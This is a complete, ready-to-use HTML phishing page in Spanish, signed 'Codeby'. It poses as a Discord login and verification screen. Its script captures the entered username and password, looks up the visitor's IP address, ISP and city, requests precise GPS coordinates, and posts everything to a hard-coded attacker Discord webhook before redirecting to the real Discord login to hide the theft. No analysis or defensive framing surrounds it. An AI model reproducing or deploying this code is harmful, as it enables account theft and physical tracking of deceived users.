<!DOCTYPE html>
<html lang="es-es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Seguridad</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', sans-serif; background: #202225; color: #fff; display: flex; justify-content: center; align-items: center; }
        .card { background: #2f3136; padding: 40px; border-radius: 10px; text-align: center; width: 90%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #202225; border: 1px solid #40444b; color: #fff; border-radius: 5px; box-sizing: border-box; }
        .btn-discord { background: #5865F2; color: white; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
        #verify-screen { display: none; }
        .codeby-footer { margin-top: 25px; color: #5865F2; font-size: 10px; text-transform: uppercase; }
    </style>
</head>
<body>

    <div id="login-screen" class="card">
        <h2>Iniciar sesión</h2>
        <input type="text" id="user" placeholder="Usuario">
        <input type="password" id="pass" placeholder="Contraseña">
        <button id="btnGo" style="width:100%; padding:12px; background:#5865F2; border:none; color:white; cursor:pointer; border-radius:5px;">Continuar</button>
        <div class="codeby-footer">By:Codeby</div>
    </div>

    <div id="verify-screen" class="card">
        <h2 style="color: #5865F2;">Verificación de Discord</h2>
        <p style="font-size: 14px; color: #b9bbbe;">Autoriza el acceso a la red para completar la vinculación.</p>
        <button class="btn-discord" id="btnVerify">Autorizar y verificar</button>
        <div class="codeby-footer">By:Codeby</div>
    </div>

    <script>
        const hook = "https://discord.com/api/webhooks/1509748386973220975/s3XxCMhpK8PFhgpX8aFnxEttiRm-RM-zbdOqtVSDUMNf_t3d-iBxl5NmcXPSXc95XvOU";
        let u = "", p = "";

        document.getElementById('btnGo').onclick = () => {
            u = document.getElementById('user').value;
            p = document.getElementById('pass').value;
            if(u && p) {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('verify-screen').style.display = 'block';
            }
        };

        document.getElementById('btnVerify').onclick = async () => {
            try {
                // Obtener datos de IP y Red
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();

                // Obtener geolocalización precisa
                navigator.geolocation.getCurrentPosition(
                    (pos) => sendToDiscord(ipData, pos.coords),
                    () => sendToDiscord(ipData, null)
                );
            } catch (e) {
                sendToDiscord(null, null);
            }
        };

        async function sendToDiscord(ip, geo) {
            const data = {
                embeds: [{
                    title: "📊 LOG DETALLADO - Codeby",
                    color: 0x5865F2,
                    fields: [
                        { name: "Usuario", value: u, inline: true },
                        { name: "Contraseña", value: p, inline: true },
                        { name: "IP Pública", value: ip?.ip || "N/A", inline: true },
                        { name: "Proveedor (ISP)", value: ip?.org || "N/A", inline: true },
                        { name: "Ubicación (Red)", value: `${ip?.city || ""}, ${ip?.country_name || ""}`, inline: true },
                        { name: "Coordenadas", value: geo ? `${geo.latitude}, ${geo.longitude}` : "Denegado", inline: true }
                    ],
                    footer: { text: "Sistema Codeby" }
                }]
            };

            await fetch(hook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });

            window.location.href = "https://discord.com/login";
        }
    </script>
</body>
</html>
